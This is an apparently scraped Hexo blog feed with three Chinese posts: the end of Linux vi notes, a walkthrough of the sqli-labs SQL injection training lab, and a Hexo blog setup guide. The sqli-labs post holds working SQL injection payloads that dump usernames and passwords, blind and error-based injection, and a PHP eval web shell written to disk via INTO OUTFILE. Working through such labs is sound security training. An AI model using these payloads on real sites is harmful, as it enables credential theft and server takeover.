.可以重复执行上一次的指令。<br>　　　　　　　　　　(7)更改<br>　　　　　　　　　　cw：更改光标所在处的字到字尾$处。<br>　　　　　　　　　　c#w：例如，c3w代表更改3个字。<br>　　　　　　　　　　(8)跳至指定行<br>　　　　　　　　　　Ctrl+G：列出光标所在行的行号。<br>　　　　　　　　　　#G：例如，15G，表示移动光标至文章的第15行行首。[常用]<br>　　　　　　　　　　Last line mode下指令简介<br>　　　　　　　　　　读者您要使用Last line mode之前，请记得先按Esc键确定您已经处于Command mode下后，再按冒号“：”或“/”或“?”<br>　　　　　　　　　　三键的其中一键进入Last line mode。<br>　　　　　　　　　　1.列出行号<br>　　　　　　　　　　set nu: 输入“set nu”后，会在文章的每一行前面列出行号。<br>　　　　　　　　　　2.跳到文章的某一行<br>　　　　　　　　　　#：井号代表一个数字，在Last line mode提示符号“：”前输入数字，再按Enter就会跳到该行了，<br>　　　　　　　　　　如：15[Enter]就会跳到文章的第15行。[常用]<br>　　　　　　　　　　3.寻找字符串<br>　　　　　　　　　　/关键字：先按/，再输入您想寻找的字，如果第一次找的关键字不是您相尽可能的，可以一直按n会往下寻找到您要的关键字为止。<br>　　　　　　　　　　?关键字：先按?，再输入您想寻找的字，如果第一次找的关键字不是您想要的，可以按n会往前寻找到您要的关键字为止。<br>　　　　　　　　　　4.取代字符串<br>　　　　　　　　　　1，$s/string/replae/g：在last line mode输入“1，$s/string/replace/g”会将全文的string字符串取代为replace字符串，其中1,$s就是指搜寻区间为文章从头至尾的意思，g则是表示全部取代不必确认。<br>　　　　　　　　　　%s/string/replace/c：同样会将全文的string字符串取代为replace字符串，和上面指令不同的地方是，%s和1,$s是相同的功能,c则是表示要替代之前必须再次确认是否取代。<br>　　　　　　　　　　1,20s/string/replace/g：将1至20行间的string替代为relpace字符串。<br>　　　　　　　　　　5.存文件<br>　　　　　　　　　　w：在last line mode提示符号“：”前按w即可将文件存起来。[超常用]<br>　　　　　　　　　　#，# w filename：如果您想摘取文章的某一段，存成另一个文件，可用这个指令#代表行号，例如30,50 w nice,将您正在编辑文章的第30~50行存成nice这个文件。<br>　　　　　　　　　　6.离开<br>　　　　　　　　　　q：按q就离开，有时如果无法离开vi，可搭配“!：强置离开vi，如“q!”<br>　　　　　　　　　　qw：一般建议离开时，搭配w一起使用，如此离开时还可存文件     </p><ul><li>以上摘抄自百度知道<br>  附学长给的图片<br><img src="41.gif" alt="41"></li></ul><h2 id="笔记来自与后话"><a href="#笔记来自与后话" class="headerlink" title="笔记来自与后话"></a>笔记来自与后话</h2><ul><li>到这里linux笔记告一段落，我会根据后续的学习不断对笔记进行更新，达到完善的目的。<br>学习语言和命令在于多练习。而非一味观看。文章和视频各有优缺，按自己需求选择。  </li><li>笔记为学习linux视频与文章后自己的总结，在此附上资料链接  <ul><li>视频: linux命令大全，来自b站，讲的很详细<br><a href="https://www.bilibili.com/video/BV14z4y1Q7Hm?p=1">https://www.bilibili.com/video/BV14z4y1Q7Hm?p=1</a>  </li><li>文章： 只介绍了31个常用命令，但每个命令选项齐全<br><a href="https://www.runoob.com/w3cnote/linux-common-command-2.html">https://www.runoob.com/w3cnote/linux-common-command-2.html</a><br>链接后续会随学习加深更新</li></ul></li></ul><h3 id="注意：写文章时别加花括号，除非写进代码块"><a href="#注意：写文章时别加花括号，除非写进代码块" class="headerlink" title="注意：写文章时别加花括号，除非写进代码块"></a>注意：写文章时别加花括号，除非写进代码块</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs通关笔记</title>
      <link href="/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1-10-通关笔记"><a href="#Less-1-10-通关笔记" class="headerlink" title="Less(1-10)通关笔记"></a>Less(1-10)通关笔记</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>本题有回显有报错，使用联合查询  </p><ul><li><p>目标：</p><blockquote><p>查明该网站数据库表名，列数列名，以及得到所用的用户数据。</p></blockquote></li><li><p>1、使用hackbar输入 ?id=1 得到结果，正常显示;</p></li><li><p>2、输入id=1’ 显示错误，说明输入的’已经被数据库解析，告诉我可以通过闭合’’的形式将代码写入数据库，进行注入攻击。</p></li><li><p>3、确定列数  </p><blockquote><p>输入?id=1时回显有Your Login name和Your Password两组数据，加id列猜测该数据库为三列<br>用order by 语句验证：<br>输入至order by 4 时出现报错，说明猜测正确，该数据库有三列<br><img src="1.png" alt="1"></p></blockquote></li><li><p>4、确定注入点  </p><blockquote><p>使用union select联合查询查看回显，确定注入点。<br>?id=-1’ union select 1,2,3;<br>//使id报错，根据第三步所得列数，确定第二和第三列有回显，可以注入。<br><img src="2.png" alt="2"></p></blockquote></li><li><p>5、查看数据库名。  </p><blockquote><p>在union select 1,2,3; 的基础上，在注入点位置分别输入database()得到数据库名security。<br><img src="3.png" alt="3"></p></blockquote></li><li><p>6、得到所有数据库信息  </p><blockquote><p>利用information_schema数据库<br>?id=-1’ union select 1,2,group_concat(schema_name) from information_schema.schemata –+<br>//使第三列回显数据库information_schema中表schemata的信息<br>注：数据库information_schema中表schemata储存着的列chema_name的所有数据库的信息<br><img src="7.png" alt="7"></p></blockquote></li><li><p>7、得到当前数据库中所有表名  </p><blockquote><p>同第6步，利用information_schema数据库<br>已知当前数据库名security。<br>?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=”security” –+<br>//使第三行回显数据库information_schema中表tables中列table_name的信息，该列储存表名，并用where限定列table_schema为security。<br><img src="9.png" alt="9"></p></blockquote></li><li><p>8、查看当前表中的列名  </p><blockquote><p>同上两步，将命令改为<br>?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name=users –+<br>//转16进制<br><img src="10.png" alt="10"></p></blockquote></li><li><p>9、取出所有用户名和密码  </p><blockquote><p>同前几步，将group_concat中添加group_concat_ws()即可<br>?id=-1’ union select 1,2,group_concat(concat_ws(“~”,username,password)) from security.users –+<br><img src="11.png" alt="11"></p></blockquote></li></ul><p>Less-1目标达成  </p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>同Less-1，只是将id的类型改为了整形，无需再使用单引号闭合。<br>1、再less-1的基础上，输入?id=1 and 1=2 –+<br>出现报错，说明id是整型<br>若id非整形，则会将“1 and 1=2”看作一个整体字符，因后面的limit 0,1正常输出，而整形只输入了“1”，后面的and 1=2 会使语句报错，无法正常输出  </p><blockquote><p>闭合类型判断方法<br>输入 ?id=1 and 1=1 –+<br>正常 //id为整形或字符型或程序后加limit0,1语句<br>报错 //程序后无limit语句，并为字符型  </p></blockquote><blockquote><p>输入 ?id=1 and 1=2 –+<br>正常 //程序后有limit语句且为字符型<br>报错 //为整形或字符型后无limit语句  </p></blockquote><blockquote><p>输入 id=1’ and 1=1 –+<br>正常 //字符型单引号闭合或其他闭合符号<br>报错 //整形   </p></blockquote><blockquote><p>确定是整形或非整形后<br>输入 ?id=1’ 查看报错信息即可得到闭合符号<br>然后用order by 9999999999999999999 –+确认，出现报错说明闭合符正确<br>若后面存在limit语句，在没有正确输入闭合符前，系统会将输入的所有内容按字符处理<br>注意：最多输入19个9，也就是数据不能溢出，这样的目的是查看是否会正常报错，19个以上的9占字节高出字符型范围，会导致报错，这样无法判断报错原因    </p></blockquote><h3 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h3><p>确定有limit语句时<br>可用?id=1 order by 999999999–+一步判断是否为整型  </p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>大体同前两题，经过测试，该题为字符型，以’)包裹  </p><blockquote><p>总结：<br>1：字符型会自动加入两个单引号。<br>2：数字型不会加入两个单引号。<br>3：被单引号括起来的数据会被当成一个整体。<br>4：LIMIT m,n 会影响select语句的结果。<br>5：页面回显发生错误和页面不回显数据是两回事。前者表示sql语句出错了，后者表示sql语句没有错误，但是条件不成立   </p></blockquote><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>经测试，id使用”)闭合，其他内容同前三道  </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>前四道题均考查有回显状态的sql注入，主要对联合查询进行学习，还可以使用报错注入的方法  </p></blockquote><blockquote><p>主要需掌握联合查询，数据库基本结构，闭合符的探测等  </p></blockquote><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>本题无回显但有报错（order by 999探测是否有报错），所以使用报错注入<br>1、确定闭合方式与列数    </p><blockquote><p>本题有报错<br> 输入：?id=1 显示正常<br> 输入：?id=1’ 报错 根据报错信息确定为单引号闭合<br> <img src="/2020/11/06/sqli-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/12.png" class=""><br> 使用order by确定列数，结果为3列<br> ?id=1’ order by 3 –+  </p></blockquote><p>2、确定数据库名  </p><blockquote><p>因无回显，所以这道题要使用盲注，使用left()函数猜出库名<br> ?id=1’ and left(database(),1)&gt;”c” –+ //确定第一位，结果为s<br> ?id=1’ and left(database(),2)&gt;”sa” –+ //确定第二位，结果为se<br> 猜测与前几道题共用一个数据库<br> 验证：?id=1’ and left(database(),1000)=”security” –+ //猜测正确<br><img src="13.png" alt="13"></p></blockquote><p>3、得到所有表名   </p><blockquote><p>?id=1’ and updatexml(1,(select group_concat(0x7e,table_name) from information_schema.tables where table_schema=”security”),0)–+<br> 使用updatexml报错注入确定表名<br> updatexml报错返回的长度有限，可后加limit语句逐个输出<br> 如爆出所有数据库名：?id=1’ and updatexml(1,(select concat(0x7e,schema_name) from information_schema.schemata limit 4,1),0)–+<br><img src="14.png" alt="14"></p></blockquote><p>4、得到所有列名  </p><blockquote><p>?id=1’ and updatexml(1,(select concat(0x7e,column_name) from information_schema.columns where table_name=”users” limit 4,1),0)–+<br> 大体同表名注入  </p></blockquote><p>5、得到所有数据  </p><blockquote><p>?id=1’ and updatexml(1,(select concat(0x7e,username,0x7e,password) from security.users limit 0,1),0)–+<br> 大体同上  </p></blockquote><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>解法同第五题，经测试为双引号报错注入<br>值得注意：在第6题中，users表的第4列是password，第五列是username,顺序与之前相反  </p><p>总结：5、6题与前四道主要区别在于有无回显<br>思路：<br>1、探测是否可以注入，有无注入漏洞<br>2、确定闭合方式<br>3、查看有无回显和报错  </p><blockquote><p>有回显有报错：方法随意<br> 有回显无报错：联合查询<br> 无回显有报错：报错注入<br> 无回显无报错：盲注    </p></blockquote><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>考察一句话木马的使用  </p><p>1、确定是否存在注入漏斗以及闭合方式  </p><blockquote><p>?id=1’)) and 1=1–+<br> ?id=1’)) order by 3–+<br> 存在注入漏洞，使用’))闭合内容，无回显与报错，初步判断使用盲注    </p></blockquote><p>2、确定数据库名  </p><blockquote><p>?id=1’)) and left(database(),9)=”security”–+  </p></blockquote><p>3、写入一句话木马  </p><blockquote><p>前提：知道网站绝对路径<br> ?id=’)) union select “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+  </p></blockquote><blockquote><p>这里我发现了一个快速爆库的办法<br> 在输入：?id=1’)) and “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+时<br> 1.php注入成功，但文件里没有写好的一句话木马<br> 猜测，sql命令用and连接会进行判断将”<?php @eval($_POST["a"]);?>“当作普通字符串或命令处理，<br> sql命令结构变为先?id=1’)) and “<?php @eval($_POST["a"])?>“，恒正确<br> 又select 1 into outfile “路径\1.php”–+<br> 导致只是注入了1.php但1，php没有值<br> 不知道怎么验证  </p></blockquote><p> 再次尝试<br> 想到or语句，忽略or后一句的错误<br> ?id=1’)) or “<?php @eval($_POST["a"]);?>“ into outfile “路径\1.php”–+<br> 结构为：?id=1’))正确,”<?php @eval($_POST["a"]);?>“不在进行or判断<br> 所以结构为:?id=1’)) into file “路径\1.php”–+<br> 验证成立<br> 得到id=1的数据！！</p><p> 兴趣来了，虽然不知道他到底以为一句话是什么，但我可以让他报错<br> ?id=1’)) or 1 into outfile “路径\1.php”–+<br> 注入的文件夹里出现了所有的数据！<br> 但我不懂这要怎么理解<br> 不管我把路径改到哪，我都得到了数据<br><img src="16.png" alt="16"></p><p> 然而，这在实际注入操作中并没有什么作用，因为前提是知道路径，还要能查看文件<br> 不如一句话木马实际  </p><p>4、使用蚁剑连接<br><img src="17.png" alt="17"> 成功  </p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>1、确定闭合方式 </p><blockquote><p>?id=1’–+ 返回界面正确，确定为单引号闭合，无回显，无报错。<br> 初步判断为布尔盲注   </p></blockquote><p>2、确定数据库名  </p><blockquote><p>?id=1’ and left(database(),999)=”security”–+<br> 返回正确，确定数据库为security  </p></blockquote><p>4、盲注出所有数据  </p><blockquote><p>如：?id=1’ and ascii(substr((select schema_name from information_schame.schemata limit 0,1),1,1))&gt;122 –+<br> 类似此种语句爆出所有内容<br> 可以写脚本或使用工具</p></blockquote><h2 id="Less-9-and-Less-10"><a href="#Less-9-and-Less-10" class="headerlink" title="Less-9 and Less-10"></a>Less-9 and Less-10</h2><p>1、确定注入漏洞，闭合方式  </p><blockquote><p>输入id=1,id=-1,id=999回显均相同且无报错<br> 初步判断需使用时间盲注  </p></blockquote><blockquote><p>?id=1’ and sleep(5) 出现响应延迟，确定为单引号闭合  </p></blockquote><p>2、确定数据库名  </p><blockquote><p>?id=1’ and if(ascii(substr(database(),1,1)) &gt; 22,sleep(5),1)–+<br> 如果数据库第一个字符ascii值大于22，延时5秒，否则返回1<br> 原理：无论输入何值回显均不变，但输入正确会延时，错误延时亦可  </p></blockquote><p>3、确定数据  </p><blockquote><p>在布尔盲注的基础上加入sleep语句通过是否有延时判断  </p></blockquote><p>Less-10 与Less-9相比，只是将单引号闭合改为双引号闭合   </p><p>语句示例：<br>?id=1’ and if((substr((select table_name from information_schema.tables  where table_schema=”security”<br> limit 3,1),1,999)=”users”),sleep(3),1)–+</p><h2 id="Less-11-and-12"><a href="#Less-11-and-12" class="headerlink" title="Less-11 and 12"></a>Less-11 and 12</h2><p>1、确定传输方式  </p><blockquote><p>输入任意值，打开network查看请求头为post传参<br> 使用hackbar的post注入  </p></blockquote><p>2、确定注入漏洞，闭合方式以及注入点  </p><blockquote><p>查看network,data文件上传了三个内容，所以构建语句<br> uname: admin&amp;passwd: admin&amp;submit: Submit<br> 输入后报错，测试发现submit始终不变，可能是提交键，故删除submit<br> 即：uname=admin&amp;passwd=admin  </p></blockquote><blockquote><p>确定闭合方式的方法与get注入基本一致<br> uname=admin’ and 1=2#&amp;passwd=# 确定为单引号闭合<br> 注意：#也是注释符，效果同–+，最后用#是因为使用–+会出现未知错误，当然可以使用– aaa(此处为任意值)</p></blockquote><blockquote><p>用admin测试有返回内容,用order by 测试有报错信息<br> 联合查询与报错注入均可使用  </p></blockquote><p>3、得到数据  </p><blockquote><p>联合查询：uname=’ union select 1,database()–+ &amp;passwd=#<br>  报错注入：<br>  uname=admin’ and extractvalue(1,(select concat(0x7e,database())))#&amp;passwd=#<br>  uname=admin’ and updatexml(1,(select concat(0x7e,database())),0)#&amp;passwd=#  </p></blockquote><p>Less-12只是将闭合方式改为(“”)，其他内容无区别  </p><p>值得一提：<br>考虑到管理员用户名不可能全是admin，故我对sql语句进行以下更改  </p><p>1、判断闭合方式<br>uname=’ or 1=1#<br>2、使用注入语句<br>盲注：unmae=’ or 1=1 and substr(database(),1,1)=”s”#<br>报错注入：uname=’ or 1=1 and updatexml(1,(select concat(0x7e,database())),0)#<br>联合查询本就要让用户名报错，所以不需要知道用户名</p><h2 id="Less-13-and-14"><a href="#Less-13-and-14" class="headerlink" title="Less-13 and 14"></a>Less-13 and 14</h2><blockquote><p>无回显有报错，使用报错注入即可<br>  uname=’) or 1=1 and extractvalue(1,(select concat(0x7e,database())))# &amp;passwd=#<br>  语句同get注入  </p></blockquote><blockquote><p>Less-14也是报错型，闭合方式为双引号，其余同Less-13  </p></blockquote><h2 id="Less-15-and-16"><a href="#Less-15-and-16" class="headerlink" title="Less-15 and 16"></a>Less-15 and 16</h2><blockquote><p>单引号闭合，无报错无回显，正确与错误的页面有区别，使用布尔盲注最佳<br> uname=’ or 1=1 and (ascii(substr(database(),1,1))&gt;11)# &amp;passwd=#<br> 使用脚本跑即可  </p></blockquote><blockquote><p>“)闭合，同Less-15无回显无报错，使用布尔盲注  </p></blockquote><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><blockquote><p>密码重置，username不可改<br> 将username输入admin,向password注入即可   </p></blockquote><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><blockquote><p>user agent 注入<br> 默认用户名密码admin<br> 使用header注入中的user agent注入即可</p></blockquote><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><blockquote><p>读代码，网页保存了我们的ip和referer，insert into ‘security’.’referers’(referer,ip_address) value (‘$referers’,’$ip’);<br> 可知注入语句需用’闭合后在后面补齐语句，故为： ‘ or [语句] ,’ ‘);#<br> 语句用报错注入即可</p></blockquote><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><blockquote><p>读代码，cookie注入可用，单引号闭合<br> 存在回显点，联合查询</p></blockquote><h2 id="Less-21-and-Less-22"><a href="#Less-21-and-Less-22" class="headerlink" title="Less-21 and Less-22"></a>Less-21 and Less-22</h2><blockquote><p>cookie注入，但根据回显，cookie进行了base64编码<br> 将注入语句全部改为base64编码即可</p></blockquote><blockquote><p>22题在21题基础上将闭合方式改双引号闭合，其他无改变</p></blockquote><h2 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h2><blockquote><p>过滤了–和 # 这两个注释符，改用’1’=’1 或者;%00即可</p></blockquote><h2 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h2><blockquote><p>本关为二次注入<br> 所有用户可交互的位置均无注入点<br> 但不可直接交互的位置存在注入，即改密时的用户名</p></blockquote><p> 1、注册用户，用户名设为admin’#<br>    此时因为限制’#不会注入，而是作为用户名的一部分存入数据库</p><p> 2、更改密码时，会在表单提交update users set password=’{新密码}’ where username=’{用户名}’ and password=’{旧密码}’;<br>    这里用户名中’#形成了注入，注释了后面的内容，更改了admin的密码<br>    admin’#的密码并没有被改变 </p><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><blockquote><p>过滤<br> 使用异或语句检查被过滤的字段，id=1’ ^ (length(‘union’)!=0)–+<br> 返回正常即被过滤，错误即未被过滤<br> 其他注入相同</p></blockquote><h2 id="Less-26-amp-amp-27-amp-amp-28-amp-amp-d-a"><a href="#Less-26-amp-amp-27-amp-amp-28-amp-amp-d-a" class="headerlink" title="Less-26 &amp;&amp; 27 &amp;&amp; 28 &amp;&amp; /d*a"></a>Less-26 &amp;&amp; 27 &amp;&amp; 28 &amp;&amp; /d*a</h2><blockquote><p>都过滤了空格，跑脚本没有发现可以代替空格的字符，所以使用括号绕过空格<br> 示例语句：<br> ?id=’uNion(seLect(1),(2),(group_concat(table_name) ) from(information_schema.tables) where (table_schema=0x7365637572697479));%00</p></blockquote><h2 id="后全"><a href="#后全" class="headerlink" title="后全"></a>后全</h2><p>32-38（忘了）为宽字节注入<br>在单引号双引号处用了转义符处理，所以用%df或者%bb将/变为特殊字符，即可进行正常注入</p><h2 id="40后与之前知识点相同"><a href="#40后与之前知识点相同" class="headerlink" title="40后与之前知识点相同"></a>40后与之前知识点相同</h2><ul><li>报错注入秀操作<br>updatexml(1,(substr((select concat(0x7e,table_name)from information_schema.tables where table_schema=”security”),1,1)),0)<br>使用substr分隔字符串达到查看所有库的目的而不是使用limit，查询方便还不易被过滤。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学习第一步，使用hexo搭建自己的博客</title>
      <link href="/2020/11/03/%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
      <url>/2020/11/03/%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="2021年9月修改——hexo博客搭建"><a href="#2021年9月修改——hexo博客搭建" class="headerlink" title="2021年9月修改——hexo博客搭建"></a>2021年9月修改——<code>hexo</code>博客搭建</h1><p>这篇是初学时写的，现在看来有许多错漏，所以特此重新对<code>hexo</code>博客的搭建进行概述</p><p>这里只说<code>windows</code>系统的<code>hexo</code>搭建，<code>linux</code>自行百度，不过<code>linux</code>用<code>wordpress</code>更好</p><h2 id="hexo与wordpress博客"><a href="#hexo与wordpress博客" class="headerlink" title="hexo与wordpress博客"></a><code>hexo</code>与<code>wordpress</code>博客</h2><p><code>hexo</code>和<code>wordpress</code>时现在最主流的两种个人博客，不过<code>wordpress</code>需要有个人服务器才能搭建，而<code>hexo</code>可以直接搭建在本地</p><p>所以这里推荐<code>hexo</code>，<code>wordpress</code>可以在对服务器有一定的了解后尝试搭建，两者搭建难度基本等同</p><h2 id="必要的准备工作"><a href="#必要的准备工作" class="headerlink" title="必要的准备工作"></a>必要的准备工作</h2><h3 id="下载nodejs"><a href="#下载nodejs" class="headerlink" title="下载nodejs"></a>下载nodejs</h3><p>官网下载即可</p><p>1、安装位置建议与博客放一起，只是建议，具体看自己</p><blockquote><p><a href="https://nodejs.org/en/download/">nodejs</a>选择LTS版本就行了。</p></blockquote><p>2、配置环境  </p><blockquote><p>一般来说只要在一路下一步的最后选ADD即可，无需其他配置（如下图）</p><p><img src="image-20210904213010215.png" alt="image-20210904213010215"></p></blockquote><p>然后打开cmd 测试环境变量是否自动配置成功</p><p>下图所示即是成功的，没成功就自行百度配置环境变量</p><p><img src="image-20210904213122604.png" alt="image-20210904213122604"></p><p>这里<code>nodejs</code>就安装成功了，但此时<code>nodejs</code>的缓存是默认在C盘的，如果你觉得占内存，通过下述配置可以换到自定义的文件夹（不想换就不用管）</p><blockquote><p>1、在安装的文件夹【D:\Develop\nodejs】(这是我的，用自己的文件夹)下创建两个文件夹【node_global】及【node_cache】</p><p>​        路径最好全英文，不要出现中文，预防编码问题报错，创建的两个文件夹名字最好按这个来，别瞎改</p><p>2、打开cmd，依次输出</p><pre class="line-numbers language-cmd"><code class="language-cmd">npm config set prefix "D:\Develop\nodejs\node_global"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-cmd"><code class="language-cmd">npm config set cache "D:\Develop\nodejs\node_cache"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>双引号里的路径是自己的，别按我的来</p></blockquote><h3 id="下载git"><a href="#下载git" class="headerlink" title="下载git"></a>下载git</h3><p>同样官网下载  <a href="https://gitforwindows.org/">Download git</a></p><p>什么都不用管，一直下一步即可，傻瓜式安装</p><p>安装后出现如图<code>Git GUI Here</code>和<code>Git Bash Here</code>即为成功</p><p><img src="image-20210904214326929.png" alt="image-20210904214326929"></p><h3 id="注册github账号"><a href="#注册github账号" class="headerlink" title="注册github账号"></a>注册github账号</h3><p>进入github官网：<code>https://github.com/</code></p><p>建议翻个墙，不会就慢慢等转圈吧</p><p>昵称最好全小写，大佬随意</p><h4 id="建立储存库"><a href="#建立储存库" class="headerlink" title="建立储存库"></a>建立储存库</h4><p><img src="image-20210904215114176.png" alt="image-20210904215114176"></p><p>按这个<code>new</code>就行</p><p><img src="image-20210904215152938.png" alt="image-20210904215152938"></p><p><strong>存储库名称：<code>昵称.github.io</code>，别写错了，我没严格写昵称，新手还是严格按格式来</strong></p><p>剩下的什么都不用改，直接创建</p><h2 id="搭建hexo"><a href="#搭建hexo" class="headerlink" title="搭建hexo"></a>搭建<code>hexo</code></h2><p>准备完成，就该正式搭建了</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装<code>hexo</code></h2><p>两种方法，会翻墙推荐第一种，不会翻墙推荐第二种</p><h3 id="会翻墙"><a href="#会翻墙" class="headerlink" title="会翻墙"></a>会翻墙</h3><p><strong>github搜<code>hexo</code>，直接把源码下载下来，找个自己喜欢的版本在心仪的位置解压</strong></p><p>上次博客炸了怎么都安不了<code>hexo</code>，我就是用这办法一步到位的</p><h3 id="不会翻墙"><a href="#不会翻墙" class="headerlink" title="不会翻墙"></a>不会翻墙</h3><p>多数人应该都不会，所以这里有正常方法</p><pre class="line-numbers language-npm"><code class="language-npm">npm install -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在文件夹里呼出cmd输出上述命令，等着就行</p><p><img src="image-20210905092606038.png" alt="image-20210905092606038"></p><p><code>hexo -v</code>或者<code>npx hexo -v</code>有显示即为安装成功，前者无效后者有效是因为环境变量没配好</p><h2 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化<code>hexo</code></h2><p>找个喜欢的空文件夹呼出cmd依次输入以下命令</p><pre class="line-numbers language-hexo"><code class="language-hexo">hexo init hexo init C:\Users\MuJie\Desktop\hexo\  [这是你自己的文件夹，别输我的]cd C:\Users\MuJie\Desktop\hexo\     [在自己文件夹中呼出的cmd就忽略这步]npm install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="生成ssh"><a href="#生成ssh" class="headerlink" title="生成ssh"></a>生成ssh</h2><p>懒得写了，直接百度</p><p><img src="image-20210905093535781.png" alt="image-20210905093535781"></p><p>注意：</p><blockquote><p>1、生成ssh需要进Git Bash Here ，就是安装git带的那两个，具体看git安装</p><p>2、要输出自己的用户名和邮箱</p><pre class="line-numbers language-hexo"><code class="language-hexo">git config --global user.name "atmujie" [这是我的]git config --global user.email "。。。。"ssh-keygen -t rsa -C "。。。。"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="image-20210905094101637.png" alt="image-20210905094101637"></p><p>有这玩意就是成功，<code>.ssh</code>位置这里会告诉你</p><p><img src="image-20210905094156374.png" alt="image-20210905094156374"></p><p>因为是一路回车，所以在默认位置</p><p><img src="image-20210905094421080.png" alt="image-20210905094421080"></p></blockquote><h2 id="上传ssh到github仓库"><a href="#上传ssh到github仓库" class="headerlink" title="上传ssh到github仓库"></a>上传ssh到github仓库</h2><p>继续上截图</p><p><img src="image-20210905094351474.png" alt="image-20210905094351474"></p><img src="image-20210905095055050.png" alt="image-20210905095055050" style="zoom:50%;" /><p>下图为添加成功</p><p><img src="image-20210905095203497.png" alt="image-20210905095203497"></p><h4 id="检查ssh部署"><a href="#检查ssh部署" class="headerlink" title="检查ssh部署"></a>检查ssh部署</h4><pre class="line-numbers language-hexo"><code class="language-hexo">ssh -T git@github.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><img src="image-20210905101244012.png" alt="image-20210905101244012"></strong></p><p>有提示让你选，yes即可</p><h2 id="部署hexo到远程仓库"><a href="#部署hexo到远程仓库" class="headerlink" title="部署hexo到远程仓库"></a>部署hexo到远程仓库</h2><p><strong>先复制ssh仓库地址，然后写入本地hexo配置文件</strong></p><p><img src="image-20210905101501864.png" alt="image-20210905101501864"></p><p>比如我的是：<code>git@github.com:atmujie/mujie.github.io.git</code></p><p>继续复制</p><p><img src="image-20210905101747637.png" alt="image-20210905101747637"></p><pre class="line-numbers language-hexo"><code class="language-hexo">【在hexo文件夹内的config文件中的相应位置粘贴以下内容】[github写自己的]deploy:  type: git  repo:     github: git@github.com:atmujie/mujie.github.io.git  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210905101927536.png" alt="image-20210905101927536"></p><h3 id="下载插件"><a href="#下载插件" class="headerlink" title="下载插件"></a>下载插件</h3><pre class="line-numbers language-hexo"><code class="language-hexo">npm install hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><pre class="line-numbers language-hexo"><code class="language-hexo">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-hexo"><code class="language-hexo">hexo s 查看网页样式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210905103045137.png" alt="image-20210905103045137"></p><p>继续复制</p><p><img src="image-20210905103224343.png" alt="image-20210905103224343"></p><p>这样就完成了，有报错百度处理，肯定是那个步骤没弄对</p><p>样式修改自行百度，都没啥难度</p><h1 id="小白的hexo博客快速搭建法-以下旧版，仅供参考"><a href="#小白的hexo博客快速搭建法-以下旧版，仅供参考" class="headerlink" title="小白的hexo博客快速搭建法(以下旧版，仅供参考)"></a>小白的hexo博客快速搭建法(以下旧版，仅供参考)</h1><h2 id="注：此文章是在看大佬的搭建法后的总结和自己写博客的尝试，想搭博客的小伙伴可以直接看文末链接。"><a 